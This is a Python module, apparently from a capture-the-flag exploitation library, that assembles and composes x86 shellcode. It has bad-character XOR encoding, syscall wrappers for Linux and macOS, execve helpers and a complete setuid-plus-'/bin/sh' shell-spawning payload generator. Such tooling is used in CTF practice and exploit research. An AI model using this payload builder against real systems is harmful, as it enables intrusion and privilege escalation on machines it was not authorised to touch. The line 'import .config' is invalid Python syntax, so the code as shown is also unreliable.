# shellcode utilities
import os
import tempfile
import subprocess
import struct
import sys

from .cryptutils import md5, xor
from .langutils import switch
from .textutils import chunkstring, hexdump, d, unpack32, hexa, tobytes, byte
import .config
from .constants import *

def assemble(code, cpu=None, printerrors=True):
	"""Assemble given code to binary. Accepted cpus: "x86","amd64",
	"arm"."""
	if cpu is None:
		cpu = config.cpu()
	if cpu == "x86":
		header = "BITS 32\n"
	elif cpu == "amd64":
		header = "BITS 64\n"
	elif cpu == "arm":
		header = ""
	else:
		raise Exception("Unknown cpu " + cpu)
	filename = hexa(md5(header + code))[:8]
	path = os.path.join(tempfile.gettempdir(), "libctf")
	try:
		os.mkdir(path)
	except Exception:
		pass
	fullname = os.path.join(path, filename)
	try:
		with open(fullname, mode="rb") as f:
			binary = f.read()
			return binary
	except Exception:
		pass
	with open(fullname + ".s", "w") as f:
		f.write(header + code)
	if printerrors:
		errorstream=subprocess.STDOUT
	else:
		errorstream=subprocess.PIPE
	if cpu == "arm":
		gas = os.path.abspath(__file__)
		gas = os.path.dirname(gas) + os.sep + "bin" + os.sep + "as-linux32"
		subprocess.check_call([gas, "-m", "thumb", "-o", fullname + ".o", fullname + ".s"], stderr=errorstream)
		subprocess.check_call(["objcopy", "-O", "binary" , fullname + ".o", fullname], stderr=errorstream)
		os.unlink(fullname + ".o")
	else:
		subprocess.check_call(["nasm", "-O0", "-o", fullname, fullname + ".s"], stderr=errorstream)
	os.unlink(fullname + ".s")
	with open(fullname, mode="rb") as f:
		return f.read()

class NotSupportedException(Exception):
	def __init__(self, cpu=None, OS=None):
		super(NotSupportedException, self).__init__("Arch %s/%s not supported"%(OS, cpu))
class BadCharException(Exception):
	def __init__(self, shellcode, badchar):
		Exception.__init__(self, "shellcode contains bad char %s"%(repr(badchar),))

class _Register_Content(object):
	pass
"""Register content is undefined and can be wiped"""
REG_UNDEFINED=_Register_Content()
"""Register content is not a constant value and must not be erased"""
REG_RESERVED=_Register_Content()

class Context(object):
	cpu = None
	os = None
	badchars = b""
	syscalls = None
	all_registers = None
	state = None
	def __init__(self, cpu=None, OS=None, badchars=b""):
		if cpu is not None:
			self.cpu = cpu
		else:
			self.cpu = config.cpu()
		if OS is not None:
			self.os = OS
		else:
			self.os = config.os()
		self.badchars = tobytes(badchars)
		self.syscalls=syscalls[self.cpu][self.os]
		if(self.cpu == "x86"):
			self.all_registers = ["eax","ebx","ecx","edx","esi","edi","ebp","esp"]
		self.state = {}

class ShellcodeSnippet(object):
	minparams = 0
	maxparams = 0
	nparams = None
	args = None
	ctx=None
	def __init__(self, *args, **kwargs):
		if "ctx" in kwargs:
			self.ctx = kwargs["ctx"]
		else:
			self.ctx = Context()
		if self.nparams is not None:
			if len(args) != self.nparams:
				raise Exception("Incorrect parameters number (given %d, expected %d)"
					%(len(args), self.nparams))
		elif len(args) > self.maxparams or len(args) < self.minparams:
			raise Exception("Incorrect parameters number (given %d, expected [%d-%d])"%(len(args), self.minparams, self.maxparams))
		self.args = args
	def has_badchar(self, value):
		for i in d(value):
			if i in self.ctx.badchars:
				return True
		return False
	def get_xor(self, value):
		"""find a xored value (in registers or generated) that will not conflict with badchars"""
		for reg, v in self.ctx.state.items():
			if not type(v) == int:
				continue
			for i in self.ctx.badchars:
				if i in xor(d(value), d(v)):
					continue
				return reg, value ^ v
		# nothing useful found in registers
		xored1 = b""
		value = d(value)
		for clear in value:
			if isinstance(clear, int):
				clear = byte(clear)
			for i in range(256):
				if not byte(i) in self.ctx.badchars and not xor(byte(i), clear) in self.ctx.badchars:
					xored1 += byte(i)
					break
		if len(xored1) != len(value):
			raise Exception("Could not find a xor value to match badchars")
		xored2 = xor(xored1, value)
		return unpack32(xored1), unpack32(xored2)

	def generate_x86(self):
		return None
	def generate_amd64(self):
		return None
	def generate_arm(self):
		return None
	def generate_linux_x86(self):
		return None
	def generate_linux_amd64(self):
		return None
	def generate_linux_arm(self):
		return None
	def generate_osx_x86(self):
		return None
	def generate_osx_amd64(self):
		return None
	def generate(self):
		for case in switch(self.ctx.cpu):
			if case("x86"):
				asm = self.generate_x86()
				if asm is not None:
					return asm
				break
			if case("amd64"):
				asm = self.generate_amd64()
				if asm is not None:
					return asm
				break
			if case("arm"):
				asm = self.generate_arm()
				if asm is not None:
					return asm
				break
		#fall through on more specialized assemblers
		for case in switch(self.ctx.os + "/" + self.ctx.cpu):
			if case("linux/x86"):
				asm = self.generate_linux_x86()
				if asm is not None:
					return asm
			if case("linux/amd64"):
				asm = self.generate_linux_amd64()
				if asm is not None:
					return asm
			if case("linux/arm"):
				asm = self.generate_linux_arm()
				if asm is not None:
					return asm
			if case("osx/x86"):
				asm = self.generate_osx_x86()
				if asm is not None:
					return asm
			if case("osx/amd64"):
				asm = self.generate_osx_amd64()
				if asm is not None:
					return asm
			if case():
				raise NotSupportedException(cpu=self.ctx.cpu, OS=self.ctx.os)
	def assemble(self):
		src = self.generate()
		if config.verbose():
			sys.stderr.write(src)
		asm = assemble(src, cpu=self.ctx.cpu)
		for i in self.ctx.badchars:
			if i in asm:
				hexdump(asm, highlight=i)
				raise BadCharException(asm, i)
		return asm
	def __str__(self):
		return self.assemble()

class PushArray(ShellcodeSnippet):
	"""push an array on the stack and return its value in dest register
	PushArray(array, dest, ctx=ctx)"""
	nparams = 2
	def generate_x86(self):
		code = "\n; Pusharray(%s, %s)\n"%(str(self.args[0]), self.args[1])
		#make a copy
		array = list(self.args[0])
		dest = self.args[1]
		array.reverse()
		for v in array:
			if v in self.ctx.all_registers:
				code += "push %s\n"%(v)
			# check if value already in register
			elif v in self.ctx.state.values():
				for reg,j in self.ctx.state.items():
					if v == j:
						code += "push %s\n"%(reg)
						break
			elif self.has_badchar(v):
				xor1,xor2 = self.get_xor(v)
				if xor1 in self.ctx.all_registers:
					code += "xor %s, %d\n"%(xor1, xor2)
					code += "push %s\n"%(dest)
					self.ctx.state[xor1] = v
				else:
					code += "mov %s, %d\n"%(dest, xor1)
					code += "xor %s, %d\n"%(dest, xor2)
					code += "push %s\n"%(dest)
					self.ctx.state[dest] = v
			else:
				code += "push %d\n"%(v)
		if (dest is not None):
			code += "mov %s, esp\n"%(dest)
			self.ctx.state[dest]=REG_RESERVED

		return code

class PushString(ShellcodeSnippet):
	"""push a string on the stack and return its value in dest register
	PushString(string, dest, ctx=ctx)"""
	nparams = 2
	def generate_x86(self):
		string, dest = self.args
		code = "\n; PushString(\"%s\", %s)\n"%(string, dest)
		#push string on stack
		values = chunkstring(string, 4)
		# pad the strings with zero
		values = [tobytes(x) + b"\x00" * (4-len(x)) for x in values]
		# end the string with zero if it's not null terminated already
		if len(values)==0 or not (values[-1][3]==b"\x00" or values[-1][3]==0):
			values += [b"\x00" * 4]
		#convert to integer
		values = [struct.unpack("<I", x)[0] for x in values]
		code += PushArray(values, dest, ctx=self.ctx).generate()
		return code

class SetRegisters(ShellcodeSnippet):
	"""set data in registers with an array of (register, data) tupples
	SetRegisters( ("eax",0), ("ebx", "edx"), ctx=ctx)
	"""
	minparams = 1
	maxparams = 100
	def generate_x86(self):
		code = "\n; SetRegisters(%s)\n"%(self.args,)
		for reg, value in self.args:
			if value == REG_UNDEFINED:
				continue
			if value in self.ctx.all_registers:
				# mov reg, reg
				if reg == value:
					continue
				code += "mov %s, %s\n"%(reg, value)
			elif type(value) == str or type(value) == bytes:
				code += PushString(value, reg, ctx=self.ctx).generate()
			elif type(value) == list or type(value) == tuple:
				code += PushArray(value, reg, ctx=self.ctx).generate()
			elif value == 0:
				code += "xor %s,%s\n"%(reg, reg)
			elif value > 0 and value < 0x100:
				code += "push byte %d\npop %s\n"%(value, reg)
			else:
				code += "mov %s,%d\n"%(reg, value)
			if type(value) == int:
				self.ctx.state[reg] = value
		return code

# Common system calls

class Syscall(ShellcodeSnippet):
	"""Trigger a syscall. 
	Syscall(linux_x86_syscalls["exit"], 0, ctx=ctx)"""
	minparams=1
	maxparams=7
	def generate_linux_x86(self):
		code = "\n; Syscall(%s)\n"%(self.args,)
		params = zip(["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"],
					list(self.args)) 
		code += SetRegisters(*params, ctx=self.ctx).generate()
			
		code += "int 0x80\n"
		self.ctx.state["eax"]=REG_UNDEFINED
		return code
	def array_or_string(self, args):
		for i in args:
			if type(i)==list or type(i)==tuple:
				return True
			if type(i)==bytes and not i in self.ctx.all_registers:
				return True
		return False
	def generate_osx_x86(self):
		code = "\n; Syscall(%s)\n"%(self.args,)
		args = list(self.args[1:])
		# the pusharray changes the stack
		if "esp" in args:
			code += SetRegisters(("eax", "esp"), ctx=self.ctx).generate()
			for i in range(len(args)):
				if args[i] == "esp":
					args[i] = "eax"
		#if there is an array or a string, push it manually
		if self.array_or_string(args):
			regs = []
			for dest, arg in zip(["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"], args):
				if type(arg) == list or type(arg) == tuple:
					code += PushArray(arg, dest, ctx=self.ctx).generate()
				elif type(arg)==bytes and not arg in self.ctx.all_registers:
					code += PushString(arg, dest, ctx=self.ctx).generate()
				else:
					code += SetRegisters((dest, arg), ctx=self.ctx).generate()
				regs += [dest]
			regs.reverse()
			for reg in regs:
				code += "push %s\n"%(reg)
		else:
			#args.reverse()
			code += PushArray(args, None, ctx=self.ctx).generate()
		code += SetRegisters(("eax", self.args[0])).generate()
		code += "push eax\n"
		code += "int 0x80\n"
		code += "add esp, %d\n"%(4 + len(args) * 4,)
		self.ctx.state["eax"]=REG_UNDEFINED
		return code

class Exit(ShellcodeSnippet):
	"""Exit(exitcode, ctx=ctx)"""
	maxparams=1
	def generate(self):
		if len(self.args) > 0:
			exitcode=self.args[0]
		else:
			exitcode = 0
		return Syscall(self.ctx.syscalls["exit"], exitcode,
			ctx=self.ctx).generate()

class Write(ShellcodeSnippet):
	"""Write(fd, data, size)
	data can be a string, a register or an address"""
	minparams = 2
	maxparams = 3
	def generate_x86(self):
		fd, data = self.args[:2]
		if isinstance(data, str) and not data in self.ctx.all_registers:
			data = tobytes(data)
			size = len(data)
		elif isinstance(data, bytes) and not data in self.ctx.all_registers:
			size = len(data)
		else:
			size = self.args[2]
		return Syscall(self.ctx.syscalls["write"],
			fd, data, size, ctx=self.ctx).generate()

class Read(ShellcodeSnippet):
	"""Read(fd, data, size)
	data can be a register or an address"""
	nparams=3
	def generate(self):
		fd, data, size = self.args
		code = "\n; read(%s,%s,%s)\n"%(str(fd),str(data),str(size))
		code += Syscall(self.ctx.syscalls["read"],
			fd, data, size, ctx=self.ctx).generate()
		return code

class Getuid(ShellcodeSnippet):
	def generate(self):
		code = "\n; getuid()\n"
		code += Syscall(self.ctx.syscalls["getuid"], ctx=self.ctx).generate()
		return code

class Setuid(ShellcodeSnippet):
	nparams=1
	def generate(self):
		uid = self.args[0]
		code = "\n; setuid(%s)\n"%(str(uid),)
		code += Syscall(self.ctx.syscalls["setuid"], uid,
			ctx=self.ctx).generate()
		return code

class Execve(ShellcodeSnippet):
	"""Execve(filename, param1, ..., ctx=self.ctx)
	filename and params are strings. argv[0] set to filename"""
	minparams=1
	maxparams=2
	def generate_x86(self):
		filename = self.args[0]
		code = "; Execve(%s, %s, [NULL])\n"%(filename, self.args)
		code += PushString(filename, "ebx", ctx=self.ctx).generate()
		#environ
		code += PushArray([0], "edx", ctx=self.ctx).generate()
		#arg
		if len(self.args) > 1:
			code += PushString(self.args[1], "ecx", ctx=self.ctx).generate()
			code += PushArray(["ebx", "ecx", 0], "ecx", ctx=self.ctx).generate()
		else:
			code += PushArray(["ebx", 0], "ecx", ctx=self.ctx).generate()
		code += Syscall(self.ctx.syscalls["execve"],
			"ebx", "ecx", "edx", ctx=self.ctx).generate()
		return code

# Complete shellcodes

class SetuidExecShell(ShellcodeSnippet):
	"""setuid(getuid) + execve("/bin/sh") shellcode"""
	def generate_x86(self):
		code = Getuid(ctx=self.ctx).generate()
		code += SetRegisters(("ebx","eax"), ctx=self.ctx).generate()
		code += Setuid("ebx", ctx=self.ctx).generate()
		code += Execve("/bin/sh", ctx=self.ctx).generate()
		return code
